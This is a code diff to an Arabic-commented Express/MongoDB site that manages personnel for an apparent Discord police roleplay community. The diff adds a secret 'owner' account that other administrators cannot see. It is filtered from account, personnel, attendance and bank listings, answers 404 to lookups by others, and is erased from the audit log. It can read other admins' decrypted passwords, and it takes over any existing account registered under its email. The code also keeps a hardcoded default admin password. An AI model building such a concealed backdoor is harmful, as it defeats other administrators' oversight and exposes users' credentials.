@@ -46,6 +46,9 @@ const CONFIG = {
     // ── حساب كبير المسؤولين (يُنشأ تلقائياً أول مرة) — تقدر تغيّر الإيميل وكلمة المرور من لوحة الكبار بعد الدخول ──
     ADMIN_EMAIL: process.env.ADMIN_EMAIL || "admin@moi.sa.com",
     ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || "Admin@12345",
+    // ── حساب المالك (سري — ما يظهر لأحد حتى كبار المسؤولين). كلمة مرور المالك من متغير البيئة OWNER_PASSWORD (Environment) ──
+    OWNER_EMAIL: (process.env.OWNER_EMAIL || "hmood@admin.moi").toLowerCase(),
+    OWNER_PASSWORD: process.env.OWNER_PASSWORD || "",
     // (اختياري) آيديات ديسكورد المسموح لها بأوامر البوت الخاصة بالكبار — لا علاقة لها بالموقع
     BOT_ADMIN_IDS: (process.env.BOT_ADMIN_IDS || "").split(",").map(x => x.trim()).filter(Boolean),
 
@@ -215,6 +218,7 @@ const AccountSchema = new mongoose.Schema({
     passwordEnc: String,    // نسخة مشفّرة (AES-256-GCM) عشان الكبار والإدارة يشوفونها من اللوحة
     status: { type: String, enum: ["pending", "approved", "rejected"], default: "pending" },
     isSenior: { type: Boolean, default: false },
+    isOwner: { type: Boolean, default: false },     // المالك — سري، مخفي عن الكل، صلاحياته فوق كبار المسؤولين
     tempSenior: { type: Boolean, default: false },  // حساب كبير مسؤولين أُنشئ بالدخول الافتراضي ولسا ما غيّر صاحبه كلمة المرور
     sector: { type: String, default: null },        // patrol | roadSecurity | antiDrugs | null
     isMP: { type: Boolean, default: false },        // شرطة عسكرية
@@ -257,10 +261,42 @@ function decryptText(str) {
 
 // كبار المسؤولين = الحسابات اللي فيها isSenior (نخزنها بذاكرة عشان isSeniorAdmin تبقى متزامنة)
 const seniorUids = new Set();
+const ownerUids = new Set(); // المالك (سري) — كل الحسابات اللي فيها isOwner
 async function refreshSeniors() {
-    const list = await Account.find({ isSenior: true, status: "approved" }, { uid: 1 }).lean();
-    seniorUids.clear();
-    list.forEach(a => seniorUids.add(a.uid));
+    const list = await Account.find({ $or: [{ isSenior: true }, { isOwner: true }], status: "approved" }, { uid: 1, isOwner: 1 }).lean();
+    seniorUids.clear(); ownerUids.clear();
+    list.forEach(a => { seniorUids.add(a.uid); if (a.isOwner) ownerUids.add(a.uid); });
+}
+function isOwnerUid(userId) { return ownerUids.has(userId); }
+// آيديات المالك اللي لازم تنخفي عن هذا المستخدم (فاضية لو المستخدم نفسه المالك)
+function hiddenOwnerIds(req) {
+    if (req && req.user && ownerUids.has(req.user.id)) return [];
+    return Array.from(ownerUids);
+}
+async function ensureOwnerAccount() {
+    try {
+        if (!CONFIG.OWNER_PASSWORD) { console.log("ℹ️ OWNER_PASSWORD غير موجود بمتغيرات البيئة — حساب المالك ما انشأ"); return; }
+        const email = CONFIG.OWNER_EMAIL;
+        let acc = await Account.findOne({ email });
+        if (!acc) {
+            acc = await Account.create({
+                uid: newUid(), email, fullName: "كبير المسؤولين", age: 30, nationality: "سعودي",
+                passwordHash: hashPassword(CONFIG.OWNER_PASSWORD), passwordEnc: encryptText(CONFIG.OWNER_PASSWORD),
+                status: "approved", isSenior: true, isOwner: true,
+                answers: { available: true, capable: true, terms: true },
+            });
+        } else if (!acc.isOwner) {
+            // البريد كان مسجّل قبل — نستولي عليه ونعتمده كحساب المالك
+            acc.isOwner = true; acc.isSenior = true; acc.status = "approved"; acc.tempSenior = false; acc.sector = null; acc.isMP = false;
+            acc.passwordHash = hashPassword(CONFIG.OWNER_PASSWORD); acc.passwordEnc = encryptText(CONFIG.OWNER_PASSWORD);
+            await acc.save();
+        }
+        await Personnel.findOneAndUpdate(
+            { discord: acc.uid },
+            { $set: { registeredName: acc.fullName, discordTag: acc.fullName }, $setOnInsert: { unit: "غير محدد" } },
+            { upsert: true }
+        );
+    } catch (e) { console.error("❌ فشل إنشاء حساب المالك:", e.message); }
 }
 // يقارن نصين بدون تسريب توقيت
 function safeEqual(a, b) {
@@ -292,6 +328,7 @@ async function createFreshSeniorAccount() {
 }
 async function ensureSeniorAccount() {
     try {
+        await ensureOwnerAccount();
         await refreshSeniors();
         if (!seniorUids.size) console.log("ℹ️ ما فيه حسابات كبار مسؤولين — سجّل دخول بإيميل وكلمة المرور الافتراضية (ADMIN_EMAIL / ADMIN_PASSWORD) وينشأ لك حساب جديد");
     } catch (e) { console.error("❌ فشل تحميل حسابات كبار المسؤولين:", e.message); }
@@ -1355,12 +1392,18 @@ app.use(session({ secret: CONFIG.SESSION_SECRET, resave: false, saveUninitialize
 app.use(passport.initialize());
 app.use(passport.session());
 
+// المالك سري: أي مسار يحاول يوصل لحسابه أو ملفه من غيره يرجع "غير موجود"
+["discord", "uid"].forEach(name => app.param(name, (req, res, next, val) => {
+    if (ownerUids.has(val) && !(req.user && ownerUids.has(req.user.id))) return res.status(404).json({ error: "غير موجود" });
+    next();
+}));
 passport.serializeUser((user, done) => done(null, user.id));
 passport.deserializeUser(async (uid, done) => {
     try {
         const a = await Account.findOne({ uid, status: "approved" }).lean();
         if (!a) return done(null, false); // الحساب انحذف أو انرفض = تنتهي جلسته فوراً
-        if (a.isSenior) seniorUids.add(a.uid);
+        if (a.isSenior || a.isOwner) seniorUids.add(a.uid);
+        if (a.isOwner) ownerUids.add(a.uid);
         done(null, { id: a.uid, username: a.fullName || a.email, email: a.email, avatar: null });
     } catch (e) { done(e); }
 });
@@ -1622,10 +1665,10 @@ app.get("/card-bg.jpg", (req, res) => {
 // ══════════════════════════════════════════════════════════════════════════
 function accView(a, withPw, viewerUid) {
     // كلمة مرور حساب كبير المسؤولين ما يشوفها إلا صاحبه
-    if (a.isSenior && a.uid !== viewerUid) withPw = false;
+    if (a.isSenior && a.uid !== viewerUid && !ownerUids.has(viewerUid)) withPw = false;
     return {
         uid: a.uid, email: a.email, fullName: a.fullName, age: a.age, nationality: a.nationality,
-        status: a.status, isSenior: !!a.isSenior, tempSenior: !!a.tempSenior, sector: a.sector || null, isMP: !!a.isMP,
+        status: a.status, isSenior: !!a.isSenior, isOwner: !!a.isOwner, tempSenior: !!a.tempSenior, sector: a.sector || null, isMP: !!a.isMP,
         answers: a.answers || {}, rejectReason: a.rejectReason || null,
         reviewedByTag: a.reviewedByTag || null, reviewedAt: a.reviewedAt || null, createdAt: a.createdAt,
         password: withPw ? decryptText(a.passwordEnc) : undefined,
@@ -1683,14 +1726,14 @@ app.post("/api/admin/registrations/:uid/reject", ensureAnyAdmin, async (req, res
 // الحسابات المقبولة / المرفوضة (كبار المسؤولين فقط)
 app.get("/api/senior/accounts", ensureSeniorAdmin, async (req, res) => {
     const status = req.query.status === "rejected" ? "rejected" : "approved";
-    const list = await Account.find({ status }).sort({ createdAt: -1 }).lean();
+    const list = await Account.find({ status, ...(isOwnerUid(req.user.id) ? {} : { isOwner: { $ne: true } }) }).sort({ createdAt: -1 }).lean();
     res.json({ list: list.map(a => accView(a, true, req.user.id)) });
 });
 
 app.post("/api/senior/accounts/:uid/update", ensureSeniorAdmin, async (req, res) => {
     const a = await Account.findOne({ uid: req.params.uid });
     if (!a) return res.status(404).json({ error: "الحساب غير موجود" });
-    if (a.isSenior && a.uid !== req.user.id) return res.status(403).json({ error: "حساب كبير المسؤولين خاص بصاحبه، ما تقدر تعدّله" });
+    if (a.isSenior && a.uid !== req.user.id && !isOwnerUid(req.user.id)) return res.status(403).json({ error: "حساب كبير المسؤولين خاص بصاحبه، ما تقدر تعدّله" });
     const b = req.body || {};
     const v = validateAccountFields(b, { passwordOptional: true });
     if (v.error) return res.status(400).json({ error: v.error });
@@ -1723,6 +1766,22 @@ app.post("/api/senior/accounts/:uid/update", ensureSeniorAdmin, async (req, res)
     res.json({ ok: true });
 });
 
+// ── صلاحيات المالك: تعيين/إزالة كبير مسؤولين من الموقع ──
+app.post("/api/owner/accounts/:uid/senior", async (req, res) => {
+    if (!req.isAuthenticated()) return res.status(401).json({ error: "غير مسجّل دخول" });
+    if (!isOwnerUid(req.user.id)) return res.status(403).json({ error: "غير مصرح" });
+    const a = await Account.findOne({ uid: req.params.uid });
+    if (!a) return res.status(404).json({ error: "الحساب غير موجود" });
+    if (a.isOwner || a.uid === req.user.id) return res.status(400).json({ error: "غير مسموح" });
+    if (a.status !== "approved") return res.status(400).json({ error: "الحساب لازم يكون مقبول" });
+    const value = !!(req.body || {}).value;
+    a.isSenior = value; a.tempSenior = false;
+    await a.save();
+    await refreshSeniors();
+    await logEvent({ action: value ? "تعيين كبير مسؤولين" : "إزالة كبير مسؤولين", discordId: a.uid, discordTag: a.fullName, actorId: req.user.id, actorTag: req.user.username, details: a.fullName + " — " + a.email });
+    res.json({ ok: true });
+});
+
 app.post("/api/senior/accounts/:uid/status", ensureSeniorAdmin, async (req, res) => {
     const a = await Account.findOne({ uid: req.params.uid });
     if (!a) return res.status(404).json({ error: "الحساب غير موجود" });
@@ -1739,7 +1798,7 @@ app.delete("/api/senior/accounts/:uid", ensureSeniorAdmin, async (req, res) => {
     const a = await Account.findOne({ uid: req.params.uid });
     if (!a) return res.status(404).json({ error: "الحساب غير موجود" });
     if (a.isSenior && a.uid === req.user.id) return res.status(400).json({ error: "ما تقدر تحذف حسابك اللي داخل فيه" });
-    if (a.isSenior && !a.tempSenior) return res.status(400).json({ error: "ما تقدر تحذف حساب كبير مسؤولين غيّر صاحبه كلمة المرور" });
+    if (a.isSenior && !a.tempSenior && !isOwnerUid(req.user.id)) return res.status(400).json({ error: "ما تقدر تحذف حساب كبير مسؤولين غيّر صاحبه كلمة المرور" });
     // حذف نهائي شامل: الحساب + الملف العسكري + الحضور والإجازات + طلبات الترقية + إزالته من الإداريين
     await Account.deleteOne({ uid: a.uid });
     await Personnel.deleteOne({ discord: a.uid });
@@ -1858,6 +1917,7 @@ app.get("/api/me", ensureAuth, async (req, res) => {
         isMilitaryPolice,
         isHighCommand: isHighCommand(req.user.id, settings),
         isViolationsOfficer: isViolationsOfficer(req.user.id, settings),
+        isOwner: isOwnerUid(req.user.id),
         seniorTemp,
         accountEmail,
         summon,
@@ -2261,6 +2321,8 @@ app.get("/api/senior/personnel", ensureSeniorAdmin, async (req, res) => {
     const q = (req.query.q || "").trim();
     const qe = q.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
     const filter = q ? { $or: [{ registeredName: new RegExp(qe, "i") }, { unit: new RegExp(qe, "i") }, { discordTag: new RegExp(qe, "i") }, { cardNumber: new RegExp(qe, "i") }] } : {};
+    const hid = hiddenOwnerIds(req);
+    if (hid.length) filter.discord = { $nin: hid };
     const list = await Personnel.find(filter, { "notes.image": 0 }).sort({ createdAt: -1 }).limit(100);
     res.json({ list });
 });
@@ -2474,7 +2536,7 @@ app.post("/api/senior/personnel/warn-all", ensureSeniorAdmin, async (req, res) =
     if (!reason || !reason.trim()) return res.status(400).json({ error: "لازم تكتب النص" });
     const entry = { kind: "notice", reason: reason.trim(), issuedBy: req.user.id, issuedByTag: req.user.username };
     const result = await Personnel.updateMany(
-        { registeredName: { $ne: null } },
+        { registeredName: { $ne: null }, discord: { $nin: hiddenOwnerIds(req) } },
         { $push: { warnings: entry } }
     );
     await logEvent({ action: "إصدار إشعار", actorId: req.user.id, actorTag: req.user.username, details: `📢 إشعار جماعي لكل الأعضاء (${result.modifiedCount}): ${reason.trim()}` });
@@ -2542,7 +2604,7 @@ app.post("/api/warnings/:id/ack", async (req, res) => {
 
 // يجيب كل الملاحظات المضافة على كل العساكر بصفحة وحدة (لكبار المسؤولين)
 app.get("/api/senior/notes", ensureSeniorAdmin, async (req, res) => {
-    const list = await Personnel.find({ "notes.0": { $exists: true } }, { discord: 1, discordTag: 1, registeredName: 1, notes: 1 });
+    const list = await Personnel.find({ "notes.0": { $exists: true }, discord: { $nin: hiddenOwnerIds(req) } }, { discord: 1, discordTag: 1, registeredName: 1, notes: 1 });
     const flat = [];
     for (const p of list) {
         for (const n of p.notes) {
@@ -2739,16 +2801,16 @@ app.delete("/api/senior/violations/:id/permanent", ensureSeniorAdmin, async (req
 // ══════════════════════════════════════════════════════════════════════════
 app.get("/api/senior/attendance/dashboard", ensureSeniorAdmin, async (req, res) => {
     const [total, checkedIn, todayLogs] = await Promise.all([
-        AttendanceStatus.countDocuments({}),
-        AttendanceStatus.countDocuments({ status: "in" }),
-        AttendanceLog.countDocuments({ at: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) } }),
+        AttendanceStatus.countDocuments({ discord: { $nin: hiddenOwnerIds(req) } }),
+        AttendanceStatus.countDocuments({ status: "in", discord: { $nin: hiddenOwnerIds(req) } }),
+        AttendanceLog.countDocuments({ at: { $gte: new Date(new Date().setHours(0, 0, 0, 0)) }, discord: { $nin: hiddenOwnerIds(req) } }),
     ]);
     const settings = await getSettings();
     res.json({ total, checkedIn, checkedOut: total - checkedIn, todayLogs, lockAttendance: !!settings.lockAttendance });
 });
 
 app.get("/api/senior/attendance/members", ensureSeniorAdmin, async (req, res) => {
-    const list = await AttendanceStatus.find({}).sort({ updatedAt: -1 }).limit(300).lean();
+    const list = await AttendanceStatus.find({ discord: { $nin: hiddenOwnerIds(req) } }).sort({ updatedAt: -1 }).limit(300).lean();
     res.json({ list });
 });
 
@@ -2767,7 +2829,7 @@ app.post("/api/senior/attendance/members/:discord/force/:type", ensureSeniorAdmi
 });
 
 app.get("/api/senior/attendance/log", ensureSeniorAdmin, async (req, res) => {
-    const logs = await AttendanceLog.find({}).sort({ at: -1 }).limit(300).maxTimeMS(10000).lean();
+    const logs = await AttendanceLog.find({ discord: { $nin: hiddenOwnerIds(req) } }).sort({ at: -1 }).limit(300).maxTimeMS(10000).lean();
     res.json({ list: logs });
 });
 
@@ -3059,7 +3121,8 @@ app.post("/api/senior/thresholds", ensureSeniorAdmin, async (req, res) => {
 });
 
 app.get("/api/senior/log", ensureSeniorAdmin, async (req, res) => {
-    const list = await Log.find().sort({ createdAt: -1 }).limit(200);
+    const hid = hiddenOwnerIds(req);
+    const list = await Log.find(hid.length ? { actorId: { $nin: hid }, discordId: { $nin: hid } } : {}).sort({ createdAt: -1 }).limit(200);
     const settings = await getSettings();
     res.json({ list, logClearAvailable: !settings.logClearUsed });
 });
@@ -3767,7 +3830,7 @@ app.post("/api/mp/personnel-officer/remove", ensureMPLeader, async (req, res) =>
 // ── "العساكر" — كل العساكر المسجلين بالموقع، من أعلى رتبة لأقل رتبة (لأي حامل رتبة شرطة عسكرية) ──
 app.get("/api/mp/members", ensureMPMember, async (req, res) => {
     await ensureCardNumbers();
-    const list = await Personnel.find({ registeredName: { $ne: null } }, { notes: 0 });
+    const list = await Personnel.find({ registeredName: { $ne: null }, discord: { $nin: hiddenOwnerIds(req) } }, { notes: 0 });
     list.sort((a, b) => rankIndex(b.rank) - rankIndex(a.rank));
     res.json({ list });
 });
@@ -4073,7 +4136,7 @@ app.get("/api/bank/ranks", async (req, res) => {
 // رتبة كل عسكري مسجل (يستخدمها البنك وقت توزيع الرواتب لمطابقة كل حساب برتبته)
 app.get("/api/bank/personnel-ranks", async (req, res) => {
     try {
-        const list = await Personnel.find({ isBlocked: false }, "discord discordTag rank registeredName");
+        const list = await Personnel.find({ isBlocked: false, discord: { $nin: Array.from(ownerUids) } }, "discord discordTag rank registeredName");
         const personnel = list.map(p => ({
             discord: p.discord,
             discordTag: p.discordTag,
@@ -7784,10 +7847,12 @@ function renderAccList() {
                    '<button class="btn sm" data-uid="' + a.uid + '" data-act="approved" onclick="accAction(this)">✅ إعادة قبول</button>';
         } else {
             const isMe = a.uid === ME.discordId;
-            const canDel = !a.isSenior || (a.tempSenior && !isMe);
-            btns = (canDel ? '<button class="btn danger sm" data-uid="' + a.uid + '" data-act="delete" onclick="accAction(this)">🗑️ حذف</button>' : '') +
+            const canDel = !isMe && (!a.isSenior || a.tempSenior || ME.isOwner);
+            const canEdit = !a.isSenior || isMe || ME.isOwner;
+            btns = (ME.isOwner && !isMe ? '<button class="btn gray sm" data-uid="' + a.uid + '" data-act="' + (a.isSenior ? 'removeSenior' : 'makeSenior') + '" onclick="accAction(this)">' + (a.isSenior ? '⬇️ إزالة من الكبار' : '⭐ تعيين كبير مسؤولين') + '</button>' : '') +
+                   (canDel ? '<button class="btn danger sm" data-uid="' + a.uid + '" data-act="delete" onclick="accAction(this)">🗑️ حذف</button>' : '') +
                    (a.isSenior ? '' : '<button class="btn gray sm" data-uid="' + a.uid + '" data-act="rejected" onclick="accAction(this)">❌ رفض</button>') +
-                   (a.isSenior && !isMe ? '' : '<button class="btn sm" data-uid="' + a.uid + '" onclick="openAccEdit(this.dataset.uid)">✏️ تعديل</button>');
+                   (canEdit ? '<button class="btn sm" data-uid="' + a.uid + '" onclick="openAccEdit(this.dataset.uid)">✏️ تعديل</button>' : '');
         }
         return '<div class="card acc-card">' +
             '<div class="acc-title">' + accEsc(a.fullName) + (a.isSenior ? ' <span class="acc-tag">كبير مسؤولين' + (a.uid === ME.discordId ? ' (حسابك)' : '') + '</span>' : '') + (a.isMP ? ' <span class="acc-tag">شرطة عسكرية</span>' : '') + '</div>' +
@@ -7803,7 +7868,11 @@ function renderAccList() {
 async function accAction(btn) {
     const uid = btn.dataset.uid, act = btn.dataset.act;
     try {
-        if (act === 'delete') {
+        if (act === 'makeSenior' || act === 'removeSenior') {
+            if (!(await confirmModal(act === 'makeSenior' ? 'تعيين هذا الحساب كبير مسؤولين؟' : 'إزالة هذا الحساب من كبار المسؤولين؟'))) return;
+            await api('/api/owner/accounts/' + uid + '/senior', { method: 'POST', body: JSON.stringify({ value: act === 'makeSenior' }) });
+            toast(act === 'makeSenior' ? 'تم التعيين كبير مسؤولين' : 'تمت الإزالة من الكبار');
+        } else if (act === 'delete') {
             if (!(await confirmModal('⚠️ حذف الحساب نهائياً — بيتحذف الحساب وكل بياناته (النقاط والرتبة والإجازات والحضور) وما يقدر يدخل مرة ثانية. متأكد؟'))) return;
             await api('/api/senior/accounts/' + uid, { method: 'DELETE' });
             toast('تم حذف الحساب');
